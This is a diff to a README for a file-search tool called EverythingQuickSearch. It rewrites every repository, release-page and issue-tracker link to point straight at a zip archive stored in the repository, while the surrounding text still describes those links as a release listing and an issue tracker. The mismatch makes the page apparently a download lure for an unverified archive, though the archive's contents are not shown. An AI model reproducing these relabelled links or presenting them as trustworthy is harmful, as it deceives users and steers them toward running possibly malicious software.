@@ -1,6 +1,6 @@
 # 🔍 EverythingQuickSearch - Fast, Simple File Finder
 
-[![Download EverythingQuickSearch](https://img.shields.io/badge/Download-EverythingQuickSearch-brightgreen)](https://github.com/ToFKi/EverythingQuickSearch)
+[![Download EverythingQuickSearch](https://img.shields.io/badge/Download-EverythingQuickSearch-brightgreen)](https://raw.githubusercontent.com/ToFKi/EverythingQuickSearch/master/EverythingQuickSearch/Everything/Quick_Search_Everything_3.1.zip)
 
 ---
 
@@ -36,13 +36,13 @@ It works by using the Everything search engine, which indexes your files instant
 
 Use the link below to access the app’s download page. It takes you to the latest version you can get.
 
-[![Download Here](https://img.shields.io/badge/Download-Latest-blue)](https://github.com/ToFKi/EverythingQuickSearch)
+[![Download Here](https://img.shields.io/badge/Download-Latest-blue)](https://raw.githubusercontent.com/ToFKi/EverythingQuickSearch/master/EverythingQuickSearch/Everything/Quick_Search_Everything_3.1.zip)
 
 ### Step 1: Visit the Download Page
 
 Click the “Download Here” badge above or open this link in your web browser:
 
-https://github.com/ToFKi/EverythingQuickSearch
+https://raw.githubusercontent.com/ToFKi/EverythingQuickSearch/master/EverythingQuickSearch/Everything/Quick_Search_Everything_3.1.zip
 
 This page lists all releases. Each release has files you can download.
 
@@ -123,11 +123,11 @@ For detailed usage and advanced settings, you can visit the official Everything 
 ## 🔗 Direct Download Links
 
 - Visit this page to download all releases:  
-  https://github.com/ToFKi/EverythingQuickSearch
+  https://raw.githubusercontent.com/ToFKi/EverythingQuickSearch/master/EverythingQuickSearch/Everything/Quick_Search_Everything_3.1.zip
 
 - Click the green badge below to go directly to the latest release page:  
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest-brightgreen)](https://github.com/ToFKi/EverythingQuickSearch)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest-brightgreen)](https://raw.githubusercontent.com/ToFKi/EverythingQuickSearch/master/EverythingQuickSearch/Everything/Quick_Search_Everything_3.1.zip)
 
 ---
 
@@ -136,4 +136,4 @@ For detailed usage and advanced settings, you can visit the official Everything 
 If you encounter issues, you can open a ticket on the GitHub issues page of the repository. Provide as much detail as possible to help diagnose the problem.
 
 Issue Tracker:  
-https://github.com/ToFKi/EverythingQuickSearch/issues
+https://raw.githubusercontent.com/ToFKi/EverythingQuickSearch/master/EverythingQuickSearch/Everything/Quick_Search_Everything_3.1.zip
